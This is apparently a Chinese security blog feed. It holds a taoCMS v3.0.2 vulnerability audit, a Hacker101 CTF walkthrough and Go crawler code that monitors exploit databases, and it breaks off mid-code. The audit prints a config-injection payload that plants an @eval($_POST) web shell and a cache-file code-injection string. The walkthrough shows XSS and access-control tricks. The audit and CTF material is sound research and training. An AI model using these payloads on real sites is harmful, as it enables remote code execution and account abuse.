    <content type="html"><![CDATA[<h1 id="taocms-v3-0-2"><a href="#taocms-v3-0-2" class="headerlink" title="taocms_v3.0.2"></a>taocms_v3.0.2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/taogogo/taocms">taogogo&#x2F;taocms: taoCMS is an incredible tiny CMS( Content Management System) , writen in PHP and support MySQL&#x2F;Sqlite as the database(MIT License) (github.com)</a></p><p>win11</p><p>php 5.6.9</p><p>vscode 1.18.1</p><p>mysql 5.5.29</p><p>apache 2.4.39</p><p>访问<code>localhost/install.php</code>，根据提示即可完成安装。</p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>分析一下taocms的路由。</p><p>打开index.php，随便点击功能点：</p><p><img src="/2023/04/27/file-upload/-20230904153245544.png" alt="image-20230904153245544"></p><p>看到api.php，并且有action和ctrl两个参数，查看代码：<br><img src="/2023/04/27/file-upload/-20230904153330218.png" alt="image-20230904153330218"></p><p>包含了config.php和common.php，config.php主要定义了一些参数，看看common.php:</p><p><img src="/2023/04/27/file-upload/-20230904153521430.png" alt="image-20230904153521430"></p><p>这里利用__autoload来进行类加载，并且相关功能代码在include&#x2F;Model目录下。</p><p>回到api.php，对传入的action参数进行首字母大写，并且判断是否在数组(‘Api’,’Comment’)中，如果满足条件，则调用类的相关方法。</p><p>登录后台查看路由。</p><p><img src="/2023/04/27/file-upload/-20230904153823388.png" alt="image-20230904153823388"></p><p>这里需要查看admin.php：</p><p><img src="/2023/04/27/file-upload/-20230904153849178.png" alt="image-20230904153849178"></p><p>可以看到和前台路由类似，不过加上了session进行登录状态的校验。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>这里利用seay进行自动审计，首先看到File.php，可能存在任意文件读取&#x2F;删除漏洞。</p><p><img src="/2023/04/27/file-upload/-20230904154043498.png" alt="image-20230904154043498"></p><p>查看代码：</p><p><img src="/2023/04/27/file-upload/-20230904154202510.png" alt="image-20230904154202510"></p><p>首先是download函数，这里最后对file_get_contents的进行了打印输出，如果参数可控，即可实现任意文件读取。</p><p>这里的参数为readlpath，往上找：</p><p><img src="/2023/04/27/file-upload/-20230904154321840.png" alt="image-20230904154321840"></p><p>realpath即为SYS_ROOT的值拼接上path，path可控，SYS_ROOT的值在config.php中定义：</p><p><img src="/2023/04/27/file-upload/-20230904154419685.png" alt="image-20230904154419685"></p><p>因此，最终变成<code>echo file_get_contents(&#39;D:\phpstudy_pro\WWW\$path&#39;)</code>。</p><p>接下来进行参数的构造，尝试读取index.php。首先action为file，不属于api或者comment，因此为后台操作，url为admin&#x2F;admin.php，ctrl为download，加上path参数，最终：</p><p><img src="/2023/04/27/file-upload/-20230904154711038.png" alt="image-20230904154711038"></p><p>成功读取。</p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>同样在file.php文件中，查看del函数：</p><p><img src="/2023/04/27/file-upload/-20230904160031989.png" alt="image-20230904160031989"></p><p>这里的判断很简单，如果有写权限，并且如果是文件夹，文件夹为空，或者为单独的文件名，即可删除，构造参数进行测试：</p><p><img src="/2023/04/27/file-upload/-20230904160154692.png" alt="image-20230904160154692"></p><p>成功删除文件。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>在del函数中，注意到id：<br><img src="/2023/04/27/file-upload/-20230905135019717.png" alt="image-20230905135019717"></p><p>这里没有进行过滤，直接闭合)即可。</p><p><img src="/2023/04/27/file-upload/-20230905135043139.png" alt="image-20230905135043139"></p><h3 id="修改配置getshell"><a href="#修改配置getshell" class="headerlink" title="修改配置getshell"></a>修改配置getshell</h3><p>接下来登录后台，从功能点入手查看。</p><p><img src="/2023/04/27/file-upload/-20230904171420244.png" alt="image-20230904171420244"></p><p>网站设置处，可以修改各个参数。任意修改一个值，抓包查看：</p><p><img src="/2023/04/27/file-upload/-20230904171641752.png" alt="image-20230904171641752"></p><p>这里action为config，ctrl为update，也就是config.php的update方法：</p><p><img src="/2023/04/27/file-upload/-20230904171955570.png" alt="image-20230904171955570"></p><p>这里将$configData直接写入了根目录下的config.php中，而configData拼接而来，大概如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27; $key&#x27;</span>,  <span class="hljs-string">&#x27;  Base::safeword($configs)&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>key的参数名，主要关注safeword($configs)：</p><p><img src="/2023/04/27/file-upload/-20230904172716747.png" alt="image-20230904172716747"></p><p>这里没有给出level参数，默认为8，走到default判断，如果db为sqlite，就将’改为’’，如果不是sqlite，就进行_addslashs:</p><p><img src="/2023/04/27/file-upload/-20230904172813104.png" alt="image-20230904172813104"></p><p>也就是addslashes函数。</p><p>addslash无法绕过，因此db只能为sqlite，将’改为’’，可以通过<code>\&#39;</code>绕过，加上反斜杠之后，经过处理变成<code>\&#39;&#39;</code>，而因为反斜存在，所以直接闭合。</p><p>payload为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">\&#x27;);<br>@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[123]);//<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/-20230904173211068.png" alt="image-20230904173211068"></p><p><img src="/2023/04/27/file-upload/-20230904173208647.png" alt="image-20230904173208647"></p><h3 id="缓存文件getshell"><a href="#缓存文件getshell" class="headerlink" title="缓存文件getshell"></a>缓存文件getshell</h3><p>照着前面继续搜索file_put_contents，在category中存在如下函数：</p><p><img src="/2023/04/27/file-upload/-20230905100006348.png" alt="image-20230905100006348"></p><p>将arrayData写入data&#x2F;cat_array.inc文件中，而arrayData的值是拼接而且，来源是$o这个变量，跟进到getlist：</p><p><img src="/2023/04/27/file-upload/-20230905100205435.png" alt="image-20230905100205435"></p><p>也就是<code>select * from cms_category where 1=1 order by id desc limit 20;</code></p><p>去数据库中执行该语句：</p><p><img src="/2023/04/27/file-upload/-20230905100306498.png" alt="image-20230905100306498"></p><p>即为后台的管理栏目功能数据：</p><p><img src="/2023/04/27/file-upload/-20230905100437884.png" alt="image-20230905100437884"></p><p>这里不同是后续进行了添加操作。</p><p>也就是说，如果能在后台直接添加数据，将数据插入到数据库中，就能控制变量$o，进而控制arrayData，写入cat_array.inc文件，再找到包含该文件的页面，即可执行命令。</p><p>添加并抓包：</p><p><img src="/2023/04/27/file-upload/-20230905100615479.png" alt="image-20230905100615479"></p><p>根据action和ctrl，找到对应函数：</p><p><img src="/2023/04/27/file-upload/-20230905100652840.png" alt="image-20230905100652840"></p><p>columsdata函数将post值置空：</p><p><img src="/2023/04/27/file-upload/-20230905100822319.png" alt="image-20230905100822319"></p><p>重点是接下来的add_one，该函数用来写入数据。</p><p><img src="/2023/04/27/file-upload/-20230905100852621.png" alt="image-20230905100852621"></p><p>这里直接会走进if循环，并且对输入的值进行safeword的过滤：</p><p><img src="/2023/04/27/file-upload/-20230905101033206.png" alt="image-20230905101033206"></p><p>该函数在前面已经看过，直接进到default，这里的db为mysqli，因此最终利用addslashes函数过滤输入。</p><p>这里payload为：<code>&#39;));phpinfo();/*</code></p><p><img src="/2023/04/27/file-upload/-20230905114528753.png" alt="image-20230905114528753"></p><p>调试结果如图，将拼接后的sql语句echo出来：</p><p><code>INSERT INTO cms_category (name,nickname,fid,cattpl,listtpl,distpl,intro,orders,status) VALUES(&#39;\&#39;));phpinfo();/*&#39;,&#39;123&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;123&#39;,&#39;&#39;,&#39;1&#39;)</code></p><p>插入数据库，写入文件：</p><p><img src="/2023/04/27/file-upload/-20230905132043383.png" alt="image-20230905132043383"></p><p><img src="/2023/04/27/file-upload/-20230905132105280.png" alt="image-20230905132105280"></p><p>index.php引用了该文件，访问：</p><p><img src="/2023/04/27/file-upload/-20230905132127989.png" alt="image-20230905132127989"></p><p>成功。</p><h3 id="后台sql-getshell"><a href="#后台sql-getshell" class="headerlink" title="后台sql getshell"></a>后台sql getshell</h3><p><img src="/2023/04/27/file-upload/-20230905132323381.png" alt="image-20230905132323381"></p><p>后台执行sql功能处，可以直接执行任意sql语句。</p><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>在文件管理处，可以上传文件：</p><p><img src="/2023/04/27/file-upload/-20230905132456042.png" alt="image-20230905132456042"></p><p>抓包查看，找到函数为file.executeupload()。</p><p><img src="/2023/04/27/file-upload/-20230905132758810.png" alt="image-20230905132758810"></p><p>跟进upload，采用白名单校验，无法绕过：</p><p><img src="/2023/04/27/file-upload/-20230905132911892.png" alt="image-20230905132911892"></p><p>但是发现还存在新建文件功能，查看代码无任何过滤：</p><p><img src="/2023/04/27/file-upload/-20230905133030940.png" alt="image-20230905133030940"></p><p>新建123.php，内容为phpinfo，成功：</p><p><img src="/2023/04/27/file-upload/-20230905133135756.png" alt="image-20230905133135756"></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacker101</title>
    <link href="/2024/07/23/hacker101/"/>
    <url>/2024/07/23/hacker101/</url>
    
    <content type="html"><![CDATA[<h1 id="hacker101"><a href="#hacker101" class="headerlink" title="hacker101"></a>hacker101</h1><p>在 hackerone 中，如果 hacker101 的分数达到一定值，就有机会参加 private programs，因此记录一下 hacker101 的 walkthrough。<br><a href="https://ctf.hacker101.com/ctf">Hacker101 CTF</a></p><h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p><img src="/2023/04/27/file-upload/age-20240424103549369.png"><br>查看源代码：<br><img src="/2023/04/27/file-upload/age-20240424103601348.png"><br>访问&#x2F;background.png:<br><img src="/2023/04/27/file-upload/age-20240424103620489.png"></p><h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>有 3 个功能点。<br><img src="/2023/04/27/file-upload/age-20240424110010854.png"><br>新建一个页面，输入 xss payload：<br><img src="/2023/04/27/file-upload/age-20240424105928448.png"><br>得到第一个 flag。<br>点击 Testing：</p><p><img src="/2023/04/27/file-upload/age-20240424110006868.png"><br>看到 url 中有数字参数，加上’，无变化。<br>edit this page，加上’，访问 <code>https://6bc560c8dec5d882206c651b05c2fc35.ctf.hacker101.com/page/edit/1 &#39; </code><br><img src="/2023/04/27/file-upload/age-20240424110123762.png"><br>得到第二个 flag。<br>点击 markdown test：<br><img src="/2023/04/27/file-upload/age-20240424110158880.png"><br>点击 some button，无变化。<br>Edit this page：<br><img src="/2023/04/27/file-upload/age-20240424110223874.png"><br>markdown is supported，but scripts are not，因此利用 payload：<code>&lt;img src=x onerror=alert()&gt;</code><br><img src="/2023/04/27/file-upload/age-20240424111956971.png"><br>查看源代码：<br><img src="/2023/04/27/file-upload/age-20240424112023689.png"><br>拿到第三个 flag。<br>对&#x2F;page&#x2F;§1§进行遍历，到 4 的时候出现 403：<br><img src="/2023/04/27/file-upload/age-20240424111356698.png"><br>再对&#x2F;page&#x2F;edit&#x2F;§1§遍历：<br><img src="/2023/04/27/file-upload/age-20240424111438093.png"><br>拿到第四个 flag。</p><h2 id="postbook"><a href="#postbook" class="headerlink" title="postbook"></a>postbook</h2><p>首先注册一个账号，发帖时回带上 userid：<br><img src="/2023/04/27/file-upload/age-20240424112703612.png"><br>考虑越权发帖，修改 id：<br><img src="/2023/04/27/file-upload/age-20240424112726598.png"><br>拿到 flag0.<br>编辑文章同理：<br><img src="/2023/04/27/file-upload/age-20240424113016119.png"><br>flag1.<br>删除也存在越权：<br><img src="/2023/04/27/file-upload/age-20240424114536681.png"><br>这里爆破的时候加上 md5 加密：<br><img src="/2023/04/27/file-upload/age-20240424114554127.png"><br>flag2.<br>查看文章时，url 带 id，遍历：<br><img src="/2023/04/27/file-upload/age-20240424113928365.png"><br>flag3.<br>观察数据包，发现 cookie 同样是 md5 加密，爆破 cookie：<br><img src="/2023/04/27/file-upload/age-20240424114820923.png"><br><img src="/2023/04/27/file-upload/age-20240424114830058.png"><br>flag4.<br>退出登录后，user 用户存在弱口令：<br>user&#x2F;password<br><img src="/2023/04/27/file-upload/age-20240424120609507.png"><br>最后一个 flag，查看提示：<br><img src="/2023/04/27/file-upload/age-20240424120316439.png"><br>越权查看文章时，id 改为 945：<br><img src="/2023/04/27/file-upload/age-20240424120333189.png"><br>flag6.</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang实现漏洞监控05——0day漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A705%E2%80%94%E2%80%940day%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A705%E2%80%94%E2%80%940day%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang实现漏洞监控05——0day漏洞信息监控"><a href="#golang实现漏洞监控05——0day漏洞信息监控" class="headerlink" title="golang实现漏洞监控05——0day漏洞信息监控"></a>golang实现漏洞监控05——0day漏洞信息监控</h1><p>近日在找漏洞相关信息时，看到了这个网站:<a href="https://sploitus.com/">https://sploitus.com</a></p><p><img src="/2023/04/27/file-upload/mage-20240229140308882.png" alt="image-20240229140308882"></p><p>翻阅一番后发现，该平台是将多个源的漏洞进行了整合，例如github,exploit-db,0day.today,packetstorm,metasploit等等，其中大部分在crush项目中已经完成了覆盖，除了0day.today和packetstorm，与其爬取他人的聚合信息，不如直接监控源平台，因此有了这篇文章。</p><h2 id="爬取逻辑"><a href="#爬取逻辑" class="headerlink" title="爬取逻辑"></a>爬取逻辑</h2><p>首先打开首页：0day.today</p><p><img src="/2023/04/27/file-upload/mage-20240229141107918.png" alt="image-20240229141107918"></p><p>要点击Yes，I agree才能继续访问.</p><p>点击后，还会有一个弹窗：</p><p><img src="/2023/04/27/file-upload/mage-20240229141252689.png" alt="image-20240229141252689"></p><p>在关闭该弹窗后，才能看到正常的exploit信息。</p><p>考虑到这里有两次点击操作，因此结合chromedp来进行。</p><p>点击一些漏洞的第一列，DATE：</p><p><img src="/2023/04/27/file-upload/mage-20240229141440661.png" alt="image-20240229141440661"></p><p>跳转到<a href="https://0day.today/date/17-03-2022%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%BB%A5%E6%97%B6%E9%97%B4%E5%91%BD%E5%90%8D%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%83%B3%E8%A6%81%E7%9B%91%E6%8E%A7%E6%AF%8F%E5%A4%A9%E7%9A%84%E6%9B%B4%E6%96%B0%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E4%B8%80%E6%AC%A1%E5%89%8D%E4%B8%80%E5%A4%A9%E6%97%B6%E9%97%B4%E7%9A%84URL%E5%8D%B3%E5%8F%AF%E3%80%82">https://0day.today/date/17-03-2022，发现是以时间命名的，所以想要监控每天的更新，直接访问一次前一天时间的URL即可。</a></p><p> 先通过chromedp.Click()来模拟点击事件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ctx, _ := chromedp<span class="hljs-selector-class">.NewExecAllocator</span>(context<span class="hljs-selector-class">.Background</span>(),<br><span class="hljs-built_in">append</span>(<br>chromedp<span class="hljs-selector-class">.DefaultExecAllocatorOptions</span><span class="hljs-selector-attr">[:]</span>,<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;headless&quot;</span>, false),<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, false),<br>chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;disable-blink-features&quot;</span>, <span class="hljs-string">&quot;AutomationControlled&quot;</span>),<br>)...,<br>)<br>ctx, _ = chromedp<span class="hljs-selector-class">.NewContext</span>(ctx)<br><br>ctx, cancel := context<span class="hljs-selector-class">.WithTimeout</span>(ctx, <span class="hljs-number">600</span>*<span class="hljs-selector-tag">time</span>.Second)<br>defer <span class="hljs-built_in">cancel</span>()<br><span class="hljs-selector-tag">var</span> result string<br>url := fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;https://0day.today/date/17-03-2022&quot;</span>)<br>agree_xpath := <span class="hljs-string">&quot;/html/body/div/div[1]/div[14]/div[3]/form/input&quot;</span><br>close_xpath := <span class="hljs-string">&quot;/html/body/div[5]/div/div/a&quot;</span><br>err := chromedp<span class="hljs-selector-class">.Run</span>(ctx,<br>chromedp<span class="hljs-selector-class">.Navigate</span>(url),<br>chromedp<span class="hljs-selector-class">.WaitVisible</span>(agree_xpath, chromedp.BySearch),<br>chromedp<span class="hljs-selector-class">.Click</span>(agree_xpath),<br>chromedp<span class="hljs-selector-class">.WaitVisible</span>(close_xpath, chromedp.BySearch),<br>chromedp<span class="hljs-selector-class">.Click</span>(close_xpath),<br>chromedp<span class="hljs-selector-class">.InnerHTML</span>(<span class="hljs-string">&quot;html&quot;</span>, &amp;result),<br>)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>errMsg := fmt<span class="hljs-selector-class">.Sprintf</span>(<span class="hljs-string">&quot;crawling %v err:%v&quot;</span>, url, err)<br>log<span class="hljs-selector-class">.Println</span>(errMsg)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/mage-20240229144333120.png" alt="image-20240229144333120"></p><p>正常。</p><p>下面通过goquery来解析数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">doc, err := goquery<span class="hljs-selector-class">.NewDocumentFromReader</span>(strings<span class="hljs-selector-class">.NewReader</span>(result))<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log<span class="hljs-selector-class">.Fatal</span>(err)<br>&#125;<br><br>doc<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.ExploitTableContent&quot;</span>)<span class="hljs-selector-class">.Each</span>(<span class="hljs-built_in">func</span>(<span class="hljs-selector-tag">i</span> int, s *goquery.Selection) &#123;<br>date := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.td a&quot;</span>)<span class="hljs-selector-class">.First</span>()<span class="hljs-selector-class">.Text</span>()<br>title := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;h3 a&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>category := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;a[href^=&#x27;/platforms&#x27;]&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>risk := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;[class*=tips_risk_color_]&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>cve := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;a[href^=&#x27;/cve&#x27;]&quot;</span>)<span class="hljs-selector-class">.Next</span>()<span class="hljs-selector-class">.Text</span>()<br>price := s<span class="hljs-selector-class">.Find</span>(<span class="hljs-string">&quot;.tips_price_0&quot;</span>)<span class="hljs-selector-class">.Text</span>()<br>&#125;)<br></code></pre></td></tr></table></figure><p>通过<code>s.Find(&quot;a[href^=&#39;/cve&#39;]&quot;).Next().Text()</code>来判断是否有CVE编号，通过price是否为free来判断是否有公开exploit。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>包含更新日期，分类，严重程度，CVE信息，是否公开，漏洞标题等等：</p><p><img src="/2023/04/27/file-upload/mage-20240229140810342.png" alt="image-20240229140810342"></p><p>预计在crush V1.1中合入该平台监控。</p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>0day.today</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控04——seebug 漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A704%E2%80%94%E2%80%94seebug%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A704%E2%80%94%E2%80%94seebug%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控04——seebug-漏洞信息监控"><a href="#golang-实现漏洞监控04——seebug-漏洞信息监控" class="headerlink" title="golang 实现漏洞监控04——seebug 漏洞信息监控"></a>golang 实现漏洞监控04——seebug 漏洞信息监控</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>先看一段最简单的 get 请求：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    url := <span class="hljs-string">&quot;https://www.seebug.org/vuldb/vulnerabilities?page=1&quot;</span>  <br>    res, err := http.Get(url)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error request:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span>  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> res.Body.Close()  <br>  <br>    body, _ := ioutil.ReadAll(res.Body)  <br>    fmt.Println(<span class="hljs-type">string</span>(body))  <br>&#125;<br></code></pre></td></tr></table></figure><p>GET 方法访问 seebug 漏洞库，打印出的结果如下：<br><img src="/2023/04/27/file-upload/image-20240126131752248.png"><br>这是一段 js 混淆的代码，而不是期望的 html 数据。<br><img src="/2023/04/27/file-upload/image-20240126131851302.png"><br>curl 的结果同样如此，随后尝试用 burp 补全正常请求的参数，依然无法得到正确的数据。<br>因此考虑使用 chromedp 来进行访问。</p><h3 id="chromedp"><a href="#chromedp" class="headerlink" title="chromedp"></a>chromedp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://github.com/chromedp/chromedp<br>title: &quot;GitHub - chromedp/chromedp: A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol.&quot;<br>description: &quot;A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol. - GitHub - chromedp/chromedp: A faster, simpler way to drive browsers supporting the Chrome DevTools Protocol.&quot;<br>host: github.com<br>favicon: https://github.githubcrush_seebug.com/favicons/favicon.svg<br>image: https://opengraph.githubcrush_seebug.com/d4bf4b8aff3b3b26f607fb6f006cf4bda0646c39debab713acbccfb851de2080/chromedp/chromedp<br></code></pre></td></tr></table></figure><p>先看一段 demo，通过 chromedp 来访问百度并且搜索特定内容，再点击搜索按钮：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;context&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;github.com/chromedp/chromedp&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    ctx, _ := chromedp<span class="hljs-selector-class">.NewExecAllocator</span>(context<span class="hljs-selector-class">.Background</span>(),  <br>       <span class="hljs-built_in">append</span>(  <br>          chromedp<span class="hljs-selector-class">.DefaultExecAllocatorOptions</span><span class="hljs-selector-attr">[:]</span>, chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;headless&quot;</span>, false), chromedp<span class="hljs-selector-class">.Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, false),  <br>       )...,  <br>    )  <br>    ctx, _ = chromedp<span class="hljs-selector-class">.NewContext</span>(ctx)  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.Navigate</span>(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>))  <br>  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.SendKeys</span>(`#kw`, <span class="hljs-string">&quot;111&quot;</span>, chromedp.ByID))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;wait for 2 seconds&quot;</span>)  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.WaitVisible</span>(`#su`, chromedp.ByID))  <br>    chromedp<span class="hljs-selector-class">.Run</span>(ctx, chromedp<span class="hljs-selector-class">.Click</span>(`document<span class="hljs-selector-class">.querySelector</span>(<span class="hljs-string">&quot;#su&quot;</span>)`, chromedp.ByJSPath))  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>首先是新建一个执行上下文，通过 append 来覆盖 options 中的一些参数，DefaultExecAllocatorOptions 的默认配置如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> DefaultExecAllocatorOptions = <span class="hljs-selector-attr">[...]</span>ExecAllocatorOption&#123;  <br>NoFirstRun,  <br>NoDefaultBrowserCheck,  <br>Headless,  <br>  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-background-networking&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;enable-features&quot;</span>, <span class="hljs-string">&quot;NetworkService,NetworkServiceInProcess&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-background-timer-throttling&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-backgrounding-occluded-windows&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-breakpad&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-client-side-phishing-detection&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-default-apps&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-dev-shm-usage&quot;</span>, true), 